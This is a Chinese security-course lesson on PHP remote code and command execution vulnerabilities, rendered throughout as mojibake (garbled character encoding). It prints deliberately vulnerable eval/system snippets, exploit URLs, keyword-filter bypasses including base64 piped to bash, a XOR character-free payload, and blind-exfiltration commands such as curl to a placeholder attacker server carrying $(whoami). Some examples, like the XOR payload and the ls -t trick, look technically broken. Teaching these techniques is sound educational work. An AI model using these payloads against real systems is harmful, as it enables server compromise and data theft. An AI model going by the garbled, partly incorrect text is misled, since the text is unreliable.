# ğŸš€ è¯¾ç¨‹P58ï¼šRCEä»£ç ä¸å‘½ä»¤æ‰§è¡Œæ¼æ´è¯¦è§£

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_0.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_2.png)

åœ¨æœ¬èŠ‚è¯¾ä¸­ï¼Œæˆ‘ä»¬å°†è¦å­¦ä¹ RCEï¼ˆè¿œç¨‹ä»£ç /å‘½ä»¤æ‰§è¡Œï¼‰æ¼æ´çš„æ ¸å¿ƒæ¦‚å¿µã€åŸç†ã€å±å®³ã€å¸¸è§çš„è¿‡æ»¤ç»•è¿‡æŠ€æœ¯ï¼ˆåŒ…æ‹¬å¼‚æˆ–æ— å­—ç¬¦ã€æ— å›æ˜¾æ–¹æ¡ˆï¼‰ï¼Œä»¥åŠå¦‚ä½•åœ¨ç™½ç›’ä»£ç å®¡è®¡å’Œé»‘ç›’å®æˆ˜ä¸­æŒ–æ˜æ­¤ç±»æ¼æ´ã€‚

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_4.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_6.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_8.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_10.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_12.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_14.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_16.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_18.png)

## ğŸ“š æ¦‚è¿°ï¼šä»€ä¹ˆæ˜¯RCEï¼Ÿ

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_20.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_22.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_24.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_26.png)

RCEæ˜¯â€œè¿œç¨‹ä»£ç /å‘½ä»¤æ‰§è¡Œâ€æ¼æ´çš„ç»Ÿç§°ã€‚å®ƒä¸»è¦åˆ†ä¸ºä¸¤ç±»ï¼š
1.  **ä»£ç æ‰§è¡Œ**ï¼šæ”»å‡»è€…èƒ½å¤Ÿä½¿åº”ç”¨ç¨‹åºæ‰§è¡Œå…¶æ³¨å…¥çš„è„šæœ¬ä»£ç ï¼ˆå¦‚PHPã€Pythonä»£ç ï¼‰ã€‚
2.  **å‘½ä»¤æ‰§è¡Œ**ï¼šæ”»å‡»è€…èƒ½å¤Ÿä½¿åº”ç”¨ç¨‹åºè°ƒç”¨å¹¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆå¦‚`whoami`ã€`ipconfig`ï¼‰ã€‚

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_28.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_30.png)

è™½ç„¶ä¸¤è€…æ‰§è¡Œçš„å¯¹è±¡ä¸åŒï¼Œä½†åœ¨å®é™…åˆ©ç”¨ä¸­å¸¸å¸¸å¯ä»¥ç›¸äº’è½¬æ¢ï¼Œå› æ­¤è¢«ç»Ÿç§°ä¸ºRCEæ¼æ´ï¼Œå±å®³æå¤§ï¼Œå¯ç›´æ¥å¯¼è‡´æœåŠ¡å™¨æƒé™æ²¦é™·ã€‚

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_32.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_34.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_36.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_38.png)

---

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_40.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_42.png)

## ğŸ” ç¬¬ä¸€éƒ¨åˆ†ï¼šæ¼æ´åŸç†ä¸æ¼”ç¤º

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_44.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬æ¦‚è¿°äº†RCEçš„åŸºæœ¬æ¦‚å¿µï¼Œæœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹åœ¨PHPè¯­è¨€ä¸­ï¼Œè¿™ä¸¤ç±»æ¼æ´çš„å…·ä½“ä»£ç è¡¨ç°ã€‚

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_46.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_48.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_50.png)

### ä»£ç æ‰§è¡Œæ¼æ´

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_52.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_54.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_56.png)

åœ¨PHPä¸­ï¼ŒæŸäº›å‡½æ•°å¦‚æœæ¥æ”¶äº†ç”¨æˆ·å¯æ§çš„è¾“å…¥å¹¶ç›´æ¥æ‰§è¡Œï¼Œå°±ä¼šé€ æˆä»£ç æ‰§è¡Œæ¼æ´ã€‚

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_58.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_60.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_62.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_64.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_66.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_68.png)

ä»¥ä¸‹æ˜¯é€ æˆä»£ç æ‰§è¡Œçš„å¸¸è§PHPå‡½æ•°ï¼š
*   `eval()`
*   `assert()`
*   `preg_replace()` (é…åˆ`/e`ä¿®é¥°ç¬¦æ—¶)
*   `create_function()`
*   `array_map()`
*   `call_user_func()`
*   `call_user_func_array()`

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_70.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_72.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_74.png)

**æ¼æ´ç¤ºä¾‹ä»£ç ï¼š**
```php
<?php
$code = $_GET[â€˜câ€˜];
eval($code);
?>
```
**åˆ©ç”¨æ–¹å¼ï¼š**
è®¿é—® `http://target.com/test.php?c=phpinfo();`ï¼Œ`phpinfo()`å‡½æ•°å°†è¢«æ‰§è¡Œã€‚

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_76.png)

### å‘½ä»¤æ‰§è¡Œæ¼æ´

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_78.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_80.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_82.png)

åœ¨PHPä¸­ï¼ŒæŸäº›å‡½æ•°ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè‹¥å‚æ•°ç”¨æˆ·å¯æ§ï¼Œåˆ™ä¼šé€ æˆå‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_84.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_86.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_88.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_90.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_92.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_94.png)

ä»¥ä¸‹æ˜¯é€ æˆå‘½ä»¤æ‰§è¡Œçš„å¸¸è§PHPå‡½æ•°ï¼š
*   `system()`
*   `exec()`
*   `shell_exec()`
*   `passthru()`
*   `popen()`
*   `proc_open()`
*   `` `ï¼ˆåå¼•å·ï¼‰ ``

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_96.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_98.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_100.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_102.png)

**æ¼æ´ç¤ºä¾‹ä»£ç ï¼š**
```php
<?php
$cmd = $_GET[â€˜câ€˜];
system($cmd);
?>
```
**åˆ©ç”¨æ–¹å¼ï¼š**
è®¿é—® `http://target.com/test.php?c=whoami`ï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ`whoami`å‘½ä»¤å¹¶è¿”å›ç»“æœã€‚

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_104.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_106.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_108.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_110.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_112.png)

### ä»£ç æ‰§è¡Œä¸å‘½ä»¤æ‰§è¡Œçš„ç›¸äº’è½¬æ¢

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_114.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_116.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_118.png)

ä¸¤è€…ä¹‹æ‰€ä»¥å¸¸è¢«ç»Ÿç§°ï¼Œæ˜¯å› ä¸ºå®ƒä»¬å¯ä»¥ç›¸äº’è½¬æ¢åˆ©ç”¨ã€‚
*   **ä»£ç æ‰§è¡Œ -> å‘½ä»¤æ‰§è¡Œ**ï¼šåœ¨ä»£ç æ‰§è¡Œä¸­è°ƒç”¨ç³»ç»Ÿå‘½ä»¤å‡½æ•°ã€‚
    ```php
    // å‡è®¾å­˜åœ¨ eval($_GET[â€˜câ€˜]);
    // ä¼ å…¥å‚æ•°ï¼šc=system(â€˜whoamiâ€˜);
    ```
*   **å‘½ä»¤æ‰§è¡Œ -> ä»£ç æ‰§è¡Œ**ï¼šé€šè¿‡å‘½ä»¤æ‰§è¡Œè°ƒç”¨è„šæœ¬è§£é‡Šå™¨æ¥è¿è¡Œä»£ç ã€‚
    ```bash
    # å‡è®¾å­˜åœ¨ system($_GET[â€˜câ€˜]);
    # ä¼ å…¥å‚æ•°ï¼šc=php -r â€œphpinfo();â€
    ```

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_120.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_122.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_124.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_126.png)

---

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_128.png)

## âš”ï¸ ç¬¬äºŒéƒ¨åˆ†ï¼šå±å®³ä¸åˆ©ç”¨

ç†è§£äº†æ¼æ´åŸç†åï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹RCEæ¼æ´çš„å·¨å¤§å±å®³ã€‚

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_130.png)

RCEæ¼æ´çš„å±å®³æ˜¯è‡´å‘½çš„ï¼Œå› ä¸ºå®ƒæ„å‘³ç€æ”»å‡»è€…å‡ ä¹å¯ä»¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šä¸ºæ‰€æ¬²ä¸ºï¼š
1.  **ç›´æ¥è·å–WebShell**ï¼šé€šè¿‡ä»£ç æ‰§è¡Œæ¼æ´å†™å…¥ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ï¼Œæˆ–ç”¨å·¥å…·ç›´æ¥è¿æ¥ã€‚
2.  **åå¼¹Shell**ï¼šé€šè¿‡å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œè®©æœåŠ¡å™¨ä¸»åŠ¨è¿æ¥æ”»å‡»è€…æ§åˆ¶çš„æœºå™¨ï¼Œè·å–ä¸€ä¸ªäº¤äº’å¼å‘½ä»¤è¡Œæƒé™ã€‚
3.  **å†…ç½‘æ¸—é€**ï¼šä»¥è¢«æ”»é™·çš„æœåŠ¡å™¨ä¸ºè·³æ¿ï¼Œæ”»å‡»å†…ç½‘å…¶ä»–æœºå™¨ã€‚
4.  **æ•°æ®çªƒå–ä¸ç¯¡æ”¹**ï¼šè¯»å–ã€ä¿®æ”¹æˆ–åˆ é™¤æœåŠ¡å™¨ä¸Šçš„æ•æ„Ÿæ•°æ®å’Œæ–‡ä»¶ã€‚
5.  **æœåŠ¡å™¨æ§åˆ¶**ï¼šå®‰è£…åé—¨ã€æŒ–çŸ¿è½¯ä»¶ï¼Œæˆ–å‘èµ·è¿›ä¸€æ­¥çš„æ”»å‡»ã€‚

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_132.png)

---

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_134.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_136.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_138.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_140.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_142.png)

## ğŸ›¡ï¸ ç¬¬ä¸‰éƒ¨åˆ†ï¼šè¿‡æ»¤ç»•è¿‡æŠ€æœ¯

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_144.png)

åœ¨å®é™…çš„CTFæ¯”èµ›æˆ–å®‰å…¨é˜²æŠ¤ä¸­ï¼Œå¼€å‘è€…ä¼šå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤ã€‚æœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•ç»•è¿‡è¿™äº›è¿‡æ»¤ã€‚

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_146.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_148.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_150.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_152.png)

### 1. é’ˆå¯¹å‘½ä»¤æ‰§è¡Œçš„å¸¸è§ç»•è¿‡

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_154.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_156.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_158.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_160.png)

å‡è®¾è¿‡æ»¤äº†`cat`ã€`flag`ç­‰å…³é”®å­—ï¼Œç›®æ ‡æ˜¯è¯»å–`flag.txt`æ–‡ä»¶ã€‚

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_162.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_164.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_166.png)

ä»¥ä¸‹æ˜¯å‡ ç§ç»•è¿‡æ–¹æ³•ï¼š
*   **é€šé…ç¬¦ç»•è¿‡**ï¼š
    ```bash
    cat fla*
    cat fl?g.txt
    ```
*   **è½¬ä¹‰ç¬¦ç»•è¿‡**ï¼š
    ```bash
    cat fl\ag.txt
    cat flâ€˜aâ€˜g.txt
    ```
*   **å˜é‡æ‹¼æ¥ç»•è¿‡**ï¼š
    ```bash
    a=fl;b=ag;cat $a$b.txt
    ```
*   **ç©ºå˜é‡ç»•è¿‡**ï¼š
    ```bash
    cat fla$@g.txt
    cat fla${x}g.txt
    ```
*   **åå¼•å·ä¸å‘½ä»¤æ›¿æ¢**ï¼š
    ```bash
    cat `ls` # å‡è®¾å½“å‰ç›®å½•åªæœ‰flag.txt
    ```
*   **ç¼–ç ç»•è¿‡**ï¼š
    ```bash
    echo â€˜Y2F0IGZsYWcudHh0Cg==â€˜ | base64 -d | bash
    # å…¶ä¸­ â€˜Y2F0IGZsYWcudHh0Cg==â€˜ æ˜¯ â€˜cat flag.txtâ€˜ çš„base64ç¼–ç 
    ```

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_168.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_170.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_172.png)

### 2. ç»„åˆç»æŠ€ï¼ˆæ— å­—ç¬¦æ–‡ä»¶åˆ›å»ºï¼‰

è¿™æ˜¯ä¸€ç§é«˜çº§æŠ€å·§ï¼Œé€šè¿‡åˆ›å»ºç‰¹å®šåç§°çš„æ–‡ä»¶ï¼Œå†åˆ©ç”¨`ls -t`ï¼ˆæŒ‰æ—¶é—´æ’åºï¼‰å°†æ–‡ä»¶åç»„åˆæˆå‘½ä»¤ã€‚
```bash
# å‡è®¾åœ¨/tmpç›®å½•ä¸‹æ“ä½œ
touch a
touch â€œgâ€
touch â€œfâ€
touch â€œlâ€
touch â€œaâ€
touch â€œcâ€
ls -t > shell.sh
# æ­¤æ—¶shell.shæ–‡ä»¶å†…å®¹ä¸º c a l f gï¼Œå³ â€˜cat fgâ€˜ï¼Œä½†é¡ºåºå¯èƒ½ä¸å¯¹
# æ›´å¯é çš„æ–¹æ³•æ˜¯ç²¾å¿ƒå®‰æ’åˆ›å»ºé¡ºåºï¼Œä½¿ ls -t è¾“å‡ºçš„æ–‡ä»¶åæ­£å¥½æ˜¯æƒ³è¦çš„å‘½ä»¤
```

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_174.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_176.png)

### 3. å¼‚æˆ–(XOR)ä¸æˆ–(OR)æ— å­—ç¬¦ç»•è¿‡ï¼ˆé’ˆå¯¹ä»£ç æ‰§è¡Œï¼‰

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_178.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_180.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_182.png)

å½“è¿‡æ»¤äº†æ‰€æœ‰å­—æ¯å’Œæ•°å­—æ—¶ï¼Œå¯ä»¥åˆ©ç”¨PHPä¸­å­—ç¬¦ä¸²çš„å¼‚æˆ–(`^`)ã€æˆ–(`|`)è¿ç®—æ¥ç”Ÿæˆæ‰€éœ€å­—ç¬¦ã€‚

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_184.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_186.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_188.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_190.png)

**åŸç†**ï¼šä¸¤ä¸ªéå­—æ¯æ•°å­—çš„å­—ç¬¦è¿›è¡Œå¼‚æˆ–/æˆ–è¿ç®—ï¼Œå¯èƒ½äº§ç”Ÿä¸€ä¸ªå­—æ¯æˆ–æ•°å­—ã€‚
ä¾‹å¦‚ï¼š `â€œ{â€œ ^ â€œ<â€œ` çš„ç»“æœæ˜¯ `â€œGâ€œ`ã€‚

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_192.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_194.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_196.png)

**å®æˆ˜åº”ç”¨**ï¼š
1.  ä½¿ç”¨ç‰¹å®šè„šæœ¬ç”Ÿæˆé’ˆå¯¹å½“å‰è¿‡æ»¤è§„åˆ™ï¼ˆå¦‚`/[a-z0-9]/i`ï¼‰çš„Payloadã€‚
2.  è„šæœ¬ä¼šç”Ÿæˆç±»ä¼¼ `$_=â€œ{â€œ^â€œ<â€œ;` çš„ä»£ç ç‰‡æ®µï¼Œæœ€ç»ˆæ‹¼æ¥æˆå¦‚ `$_($_GET[â€˜aâ€˜])`ï¼ˆå³ `system($_GET[â€˜aâ€˜])`ï¼‰çš„å¯æ‰§è¡Œä»£ç ã€‚

**ç¤ºä¾‹Payload**ï¼š
```
?c=($_=â€œ{â€œ^â€œ<â€œ).($_=â€œ}â€œ^â€œ>â€œ).($_^â€œ/â€œ).($_^â€œ;â€œ);$_();
```
ç»è¿‡è¿ç®—ï¼Œæœ€ç»ˆä¼šæ‰§è¡Œ `system()` å‡½æ•°ã€‚

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_198.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_200.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_202.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_204.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_206.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_208.png)

### 4. æ— å›æ˜¾æ¼æ´çš„åˆ©ç”¨æ–¹æ¡ˆ

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_210.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_212.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_214.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_216.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_218.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_220.png)

å½“å‘½ä»¤æˆ–ä»£ç æ‰§è¡Œäº†ï¼Œä½†æ²¡æœ‰è¾“å‡ºï¼ˆæ— å›æ˜¾ï¼‰æ—¶ï¼Œå¦‚ä½•åˆ¤æ–­æ¼æ´å­˜åœ¨å¹¶åˆ©ç”¨ï¼Ÿ

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_222.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_223.png)

ä»¥ä¸‹æ˜¯å‡ ç§æ–¹æ¡ˆï¼š
*   **å»¶æ—¶åˆ¤æ–­**ï¼šæ‰§è¡Œ`sleep 5`å‘½ä»¤ï¼Œè§‚å¯Ÿé¡µé¢å“åº”æ˜¯å¦å»¶è¿Ÿã€‚
*   **DNSå¤–å¸¦**ï¼šæ‰§è¡Œ`ping -c 1 your-domain.com`ï¼Œåœ¨è‡ªå·±çš„DNSæ—¥å¿—ä¸­æŸ¥çœ‹æ˜¯å¦æœ‰è§£æè®°å½•ã€‚
*   **HTTPå¤–å¸¦**ï¼šæ‰§è¡Œ`curl http://your-server.com/$(whoami)`ï¼Œåœ¨è‡ªå·±çš„WebæœåŠ¡å™¨æ—¥å¿—ä¸­æŸ¥çœ‹è®¿é—®è®°å½•ï¼Œå…¶ä¸­åŒ…å«äº†å‘½ä»¤æ‰§è¡Œç»“æœï¼ˆå¦‚`whoami`çš„ç»“æœï¼‰ã€‚
*   **å†™å…¥æ–‡ä»¶å†è®¿é—®**ï¼šæ‰§è¡Œ`echo â€˜testâ€˜ > /tmp/test.txt`ï¼Œç„¶åå°è¯•é€šè¿‡Webè®¿é—®`/tmp/test.txt`ï¼ˆå¦‚æœç›®å½•å¯è®¿é—®ï¼‰æ¥éªŒè¯ã€‚

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_225.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_227.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_229.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_231.png)

---

## ğŸ•µï¸ ç¬¬å››éƒ¨åˆ†ï¼šé»‘ç™½ç›’æŒ–æ˜æ€è·¯

### ç™½ç›’æŒ–æ˜ï¼ˆä»£ç å®¡è®¡ï¼‰

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_233.png)

åœ¨ç™½ç›’ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬ç›´æ¥åˆ†ææºä»£ç ã€‚

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_235.png)

**æ ¸å¿ƒæ€è·¯**ï¼š
1.  **æœç´¢å±é™©å‡½æ•°**ï¼šåœ¨ä»£ç ä¸­å…¨å±€æœç´¢ä¸Šè¿°æåˆ°çš„`eval`ã€`assert`ã€`system`ã€`exec`ç­‰å±é™©å‡½æ•°ã€‚
2.  **å›æº¯å¯æ§å‚æ•°**ï¼šæ£€æŸ¥è¿™äº›å±é™©å‡½æ•°çš„å‚æ•°æ˜¯å¦ç”¨æˆ·å¯æ§ï¼ˆæ¥è‡ª`$_GET`ã€`$_POST`ã€`$_COOKIE`ç­‰ï¼‰ã€‚
3.  **åˆ†æè¿‡æ»¤é€»è¾‘**ï¼šæ£€æŸ¥ç”¨æˆ·è¾“å…¥åœ¨åˆ°è¾¾å±é™©å‡½æ•°å‰ï¼Œæ˜¯å¦ç»è¿‡äº†è¿‡æ»¤æˆ–æ ¡éªŒã€‚åˆ†æè¿‡æ»¤æ˜¯å¦å¯è¢«ä¹‹å‰ä»‹ç»çš„æŠ€å·§ç»•è¿‡ã€‚
4.  **å¯»æ‰¾äºŒæ¬¡è§¦å‘ç‚¹**ï¼šæœ‰æ—¶å‚æ•°å¯èƒ½å…ˆè¢«å­˜å…¥æ•°æ®åº“æˆ–æ–‡ä»¶ï¼Œå†åœ¨å¦ä¸€ä¸ªé¡µé¢è¢«å–å‡ºå¹¶æ‰§è¡Œï¼Œè¿™å°±éœ€è¦è·Ÿè¸ªæ•°æ®æµã€‚

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_237.png)

### é»‘ç›’æŒ–æ˜ï¼ˆåŠŸèƒ½æµ‹è¯•ï¼‰

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_239.png)

åœ¨é»‘ç›’ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬ä¸çŸ¥é“ä»£ç é€»è¾‘ï¼Œéœ€è¦ä»åŠŸèƒ½ç‚¹æ¨æµ‹ã€‚

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_241.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_243.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_245.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_247.png)

**å¯èƒ½å­˜åœ¨RCEçš„åŠŸèƒ½ç‚¹**ï¼š
*   **ç½‘ç«™ç®¡ç†åŠŸèƒ½**ï¼šæ¨¡æ¿ç¼–è¾‘ã€ä¸»é¢˜å®‰è£…ã€æ’ä»¶å®‰è£…ã€æ•°æ®åº“å¤‡ä»½ï¼ˆå¯èƒ½è°ƒç”¨mysqldumpå‘½ä»¤ï¼‰ã€‚
*   **åœ¨çº¿å·¥å…·**ï¼šåœ¨çº¿ä»£ç æ‰§è¡Œã€åœ¨çº¿å‘½ä»¤æ‰§è¡Œã€Pingæµ‹è¯•ã€DNSæŸ¥è¯¢ã€Traceè·¯ç”±ã€‚
*   **æ–‡ä»¶å¤„ç†åŠŸèƒ½**ï¼šæ–‡ä»¶å‹ç¼©/è§£å‹ã€è§†é¢‘è½¬ç ã€å›¾ç‰‡å¤„ç†ï¼ˆå¯èƒ½è°ƒç”¨ImageMagickå‘½ä»¤ï¼‰ã€‚
*   **ç³»ç»Ÿç®¡ç†åŠŸèƒ½**ï¼šæœåŠ¡å™¨ç›‘æ§ã€æ—¥å¿—æŸ¥çœ‹ã€è¿›ç¨‹ç®¡ç†ã€‚
*   **ç¡¬ä»¶è®¾å¤‡ç®¡ç†ç•Œé¢**ï¼šè·¯ç”±å™¨ã€é˜²ç«å¢™ã€NASç­‰è®¾å¤‡çš„Webç®¡ç†ç•Œé¢ï¼Œå¸¸æ¶‰åŠå‘½ä»¤æ‰§è¡Œã€‚
*   **å·²çŸ¥æ¼æ´åˆ©ç”¨**ï¼šå…³æ³¨ç›®æ ‡ç³»ç»Ÿä½¿ç”¨çš„æ¡†æ¶ã€CMSã€ä¸­é—´ä»¶ã€ç»„ä»¶æ˜¯å¦å­˜åœ¨å…¬å¼€çš„RCEæ¼æ´ã€‚

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_249.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_251.png)

**æµ‹è¯•æ–¹æ³•**ï¼š
1.  æ‰¾åˆ°ä¸Šè¿°å¯ç–‘åŠŸèƒ½ç‚¹ã€‚
2.  å°è¯•è¾“å…¥ç®€å•çš„æµ‹è¯•å‘½ä»¤æˆ–ä»£ç ï¼ˆå¦‚`whoami`ã€`phpinfo()`ï¼‰ã€‚
3.  è§‚å¯Ÿå“åº”ï¼Œåˆ¤æ–­æ˜¯å¦æ‰§è¡Œã€‚
4.  å¦‚æœå­˜åœ¨è¿‡æ»¤ï¼Œå°è¯•ä½¿ç”¨ç»•è¿‡æŠ€æœ¯ã€‚

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_253.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_255.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_257.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_259.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_261.png)

---

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_263.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_265.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_267.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_269.png)

## ğŸ“ æ€»ç»“

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_271.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_273.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_275.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_276.png)

æœ¬èŠ‚è¯¾ä¸­æˆ‘ä»¬ä¸€èµ·å­¦ä¹ äº†RCEæ¼æ´çš„å®Œæ•´çŸ¥è¯†ä½“ç³»ï¼š
1.  **æ¦‚å¿µåŒºåˆ†**ï¼šç†è§£äº†ä»£ç æ‰§è¡Œä¸å‘½ä»¤æ‰§è¡Œçš„è”ç³»ä¸åŒºåˆ«ã€‚
2.  **åŸç†ä¸å±å®³**ï¼šé€šè¿‡PHPä»£ç ç¤ºä¾‹æŒæ¡äº†æ¼æ´äº§ç”Ÿçš„åŸå› ï¼Œå¹¶è®¤è¯†åˆ°å…¶å¯ç›´æ¥å¯¼è‡´æœåŠ¡å™¨å¤±é™·çš„ä¸¥é‡å±å®³ã€‚
